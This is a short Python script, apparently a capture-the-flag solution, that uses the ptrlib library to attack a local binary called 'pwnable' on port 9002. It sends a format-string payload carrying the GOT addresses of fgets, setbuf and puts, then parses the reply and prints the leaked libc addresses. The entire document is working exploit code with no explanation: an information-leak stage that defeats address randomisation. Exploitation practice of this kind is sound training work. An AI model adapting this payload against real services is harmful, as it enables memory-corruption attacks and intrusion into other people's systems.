from ptrlib import *

elf = ELF("./pwnable")
sock = Socket("127.0.0.1", 9002)
payload = b"AA"
payload += p32(elf.got('fgets'))
payload += p32(elf.got('setbuf'))
payload += p32(elf.got('puts'))
payload += b".%11$s"
payload += b".%12$s"
payload += b".%13$s."
sock.recvuntil("back.\n")
sock.sendline(payload)
ret = sock.recv()
rets = ret.split(b".")
addr1 = u32(rets[-3][:4])
addr2 = u32(rets[-2][:4])
addr3 = u32(rets[-4][:4])
print("[+] <setbuf> = " + hex(addr1))
print("[+] <puts> = " + hex(addr2))
print("[+] <fgets> = " + hex(addr3))
